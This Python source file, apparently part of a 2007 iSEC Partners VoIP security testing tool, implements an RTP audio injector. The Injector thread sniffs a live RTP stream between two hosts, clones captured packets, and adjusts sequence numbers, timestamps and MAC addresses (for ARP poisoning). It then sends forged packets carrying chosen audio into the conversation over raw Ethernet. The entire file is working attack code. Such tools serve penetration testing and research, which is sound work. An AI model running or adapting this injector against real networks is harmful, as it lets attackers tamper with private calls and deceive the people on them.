#!/usr/bin/env python
#
# Copyright (c) 2007 iSEC Partners, Inc.

import Queue
import threading
import time

import pygtk
pygtk.require("2.0")
import gtk

import dnet
import dpkt
import pcap

import utility


class Injector(threading.Thread):
    """Performs injection into a RTP audio conversation."""

    def __init__(self, iface, src, dst, rtp_pt, audio, notify_event, queue):
        """Construct a newly created Injector.
        
        Extends "threading.Thread.__init__"
        
        Keyword Arguments:
            iface -- the network interface to listen on
            src -- the source IP address of a RTP stream
            dst -- the destination IP address of a RTP stream
            rtp_pt -- the audio codec in use in a RTP stream
            audio -- packed binary string of audio to inject
        """

        threading.Thread.__init__(self)

        self.iface = iface        
        self.src = src
        self.dst = dst
        self.rtp_pt = rtp_pt

        self.audio = audio
        
        self.notify_event = notify_event
        self.queue = queue

    def run(self):
        """Execute the Injector in a separate thread.
        
        Overrides "threading.Thread.run()"
        """

        # Set the filter in order to limit captured packets to RTPv2 traffic between two hosts.
        # RTPv2 traffic is found in UDP packets and is indicated by a magic byte (0x80).
    	# Use the captured packet as a template for creating injected packets.
        pkt_capture = pcap.pcap(self.iface)
        pkt_capture.setfilter("udp and src host %s and dst host %s and ether[42]==128" % (self.src, self.dst))
        pkt_capture.setnonblock()

        # If no packet has been seen within ten seconds, timeout the injection thread.
        end = time.time() + 10
        while pkt_capture.dispatch(1, self.send_packets) == 0:
            if time.time() > end:
                self.queue.put("timeout")
                break
        else:
            self.queue.put("success")
        self.notify_event.set()

    def create_packets(self, pkt):
        """Generate forged RTP packets to be injected.
        
        Keyword Arguments:
            pkt -- a packed binary string as captured by pcap
        """

        sleep_short = True

        eth_frame = dpkt.ethernet.Ethernet(pkt)
        eth_frame.data.data.data = dpkt.rtp.RTP(eth_frame.data.data.data)

        ip_hdr = eth_frame.data
        udp_hdr = ip_hdr.data
        rtp_hdr = udp_hdr.data

        if rtp_hdr.pt == self.rtp_pt:
            # Reset MAC Addresses only when ARP poisoning.
            if eth_frame.dst == dnet.eth(self.iface).get():
                eth_frame.src = dnet.eth(self.iface).get()
                eth_frame.dst = dnet.arp().get(dnet.addr(self.dst)).eth

            # Set IP identifier, initial sequence numbers,  and timestamps into the future.
            ip_hdr.id += 100
            rtp_hdr.ts += 160 * 100
            rtp_hdr.seq += rtp_hdr.seq + 100

            # Each packet is the same except for the audio data, header lengths, and checksums
            for chunk in self.audio:
                rtp_hdr.data = chunk

                udp_hdr.ulen = len(udp_hdr)
                ip_hdr.len = len(ip_hdr)

                udp_hdr.sum = 0x0
                ip_hdr.sum = 0x0
                
                yield str(eth_frame)

                # This sends the packets out at an approriate rate.
                # We have seen packets being sent anywhere from every 0.009 to 0.03.
                # Some clients require modifying this.
                time.sleep(0.02)

                ip_hdr.id += 1
                rtp_hdr.seq += 1
                rtp_hdr.ts += len(chunk)                

    def send_packets(self, ts, pkt):
        """Send forged RTP packets to target hosts

        Keyword Arguments:
            pkt -- a packed binary string as captured by pcap
        """

        # Perform raw network device packet delivery.
        eth = dnet.eth(self.iface)
        for frame in self.create_packets(pkt):
            eth.send(frame)

